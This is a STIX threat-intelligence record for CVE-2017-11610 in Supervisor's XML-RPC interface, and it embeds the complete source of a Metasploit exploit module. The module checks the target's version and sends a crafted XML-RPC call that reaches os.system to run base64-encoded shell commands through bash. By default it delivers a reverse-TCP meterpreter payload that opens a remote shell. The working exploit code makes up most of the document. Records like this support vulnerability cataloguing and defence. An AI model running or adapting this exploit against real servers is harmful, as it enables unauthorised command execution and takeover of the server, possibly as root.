{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c09492cc-f72e-41ee-96fc-57b064e6b2d5",
    "created": "2024-08-14T17:01:30.359474Z",
    "modified": "2024-08-14T17:01:30.359478Z",
    "name": "\"Supervisor XML-RPC Authenticated Remote Code Execution\"",
    "description": " This module exploits a vulnerability in the Supervisor process control software, where an authenticated client can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server. The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/supervisor_xmlrpc_exec.rb",
            "external_id": "supervisor_xmlrpc_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Supervisor/supervisor/issues/964"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2017/dsa-3942"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-11610"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Supervisor XML-RPC Authenticated Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability in the Supervisor process control software, where an authenticated client\n        can send a malicious XML-RPC request to supervisord that will run arbitrary shell commands on the server.\n        The commands will be run as the same user as supervisord. Depending on how supervisord has been configured, this\n        may be root. This vulnerability can only be exploited by an authenticated client, or if supervisord has been\n        configured to run an HTTP server without authentication. This vulnerability affects versions 3.0a1 to 3.3.2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Calum Hutton <c.e.hutton@gmx.com>'\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://github.com/Supervisor/supervisor/issues/964'],\n          ['URL', 'https://www.debian.org/security/2017/dsa-3942'],\n          ['URL', 'https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610'],\n          ['CVE', '2017-11610']\n        ],\n      'Platform'       => 'linux',\n      'Targets'        =>\n        [\n          ['3.0a1-3.3.2', {}]\n        ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'DefaultOptions' =>\n        {\n          'RPORT'         => 9001,\n          'Payload'       => 'linux/x64/meterpreter/reverse_tcp',\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-07-19',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(9001),\n        OptString.new('HttpUsername', [false, 'Username for HTTP basic auth']),\n        OptString.new('HttpPassword', [false, 'Password for HTTP basic auth']),\n        OptString.new('TARGETURI', [true, 'The path to the XML-RPC endpoint', '/RPC2']),\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check_version(version)\n    if version <= Rex::Version.new('3.3.2') and version >= Rex::Version.new('3.0a1')\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n\n    print_status('Extracting version from web interface..')\n\n    params = {\n      'method'    => 'GET',\n      'uri'       => normalize_uri('/')\n    }\n    if !datastore['HttpUsername'].to_s.empty? and !datastore['HttpPassword'].to_s.empty?\n      print_status(\"Using basic auth (#{datastore['HttpUsername']}:#{datastore['HttpPassword']})\")\n      params.merge!({'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])})\n    end\n    res = send_request_cgi(params)\n\n    if res\n      if res.code == 200\n        match = res.body.match(/<span>(\\d+\\.[\\dab]\\.\\d+)<\\/span>/)\n        if match\n          version = Rex::Version.new(match[1])\n          if check_version(version)\n            print_good(\"Vulnerable version found: #{version}\")\n            return Exploit::CheckCode::Appears\n          else\n            print_bad(\"Version #{version} is not vulnerable\")\n            return Exploit::CheckCode::Safe\n          end\n        else\n          print_bad('Could not extract version number from web interface')\n          return Exploit::CheckCode::Unknown\n        end\n      elsif res.code == 401\n        print_bad(\"Authentication failed: #{res.code} response\")\n        return Exploit::CheckCode::Safe\n      else\n        print_bad(\"Unexpected HTTP code: #{res.code} response\")\n        return Exploit::CheckCode::Unknown\n      end\n    else\n      print_bad('Error connecting to web interface')\n      return Exploit::CheckCode::Unknown\n    end\n\n  end\n\n  def execute_command(cmd, opts = {})\n\n    # XML-RPC payload template, use nohup and & to detach and background the process so it doesnt hangup the web server\n    # Credit to the following urls for the os.system() payload\n    # https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610\n    # https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html\n    xml_payload = %{<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\n  <params>\n    <param>\n      <string>echo -n #{Rex::Text.encode_base64(cmd)}|base64 -d|nohup bash > /dev/null 2>&amp;1 &amp;</string>\n    </param>\n  </params>\n</methodCall>}\n\n    # Send the XML-RPC payload via POST to the specified endpoint\n    endpoint_path = target_uri.path\n    print_status(\"Sending XML-RPC payload via POST to #{peer}#{datastore['TARGETURI']}\")\n\n    params = {\n      'method'        => 'POST',\n      'uri'           => normalize_uri(endpoint_path),\n      'ctype'         => 'text/xml',\n      'headers'       => {'Accept' => 'text/xml'},\n      'data'          => xml_payload,\n      'encode_params' => false\n    }\n    if !datastore['HttpUsername'].to_s.empty? and !datastore['HttpPassword'].to_s.empty?\n      print_status(\"Using basic auth (#{datastore['HttpUsername']}:#{datastore['HttpPassword']})\")\n      params.merge!({'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])})\n    end\n    return send_request_cgi(params, timeout=5)\n\n  end\n\n  def exploit\n\n    res = execute_cmdstager(:linemax => 800)\n\n    if res\n      if res.code == 401\n        fail_with(Failure::NoAccess, \"Authentication failed: #{res.code} response\")\n      elsif res.code == 404\n        fail_with(Failure::NotFound, \"Invalid XML-RPC endpoint: #{res.code} response\")\n      else\n        fail_with(Failure::UnexpectedReply, \"Unexpected HTTP code: #{res.code} response\")\n      end\n    else\n      print_good('Request returned without status code, usually indicates success. Passing to handler..')\n      handler\n    end\n\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-07-19",
    "x_mitre_platforms": [
        "linux'"
    ]
}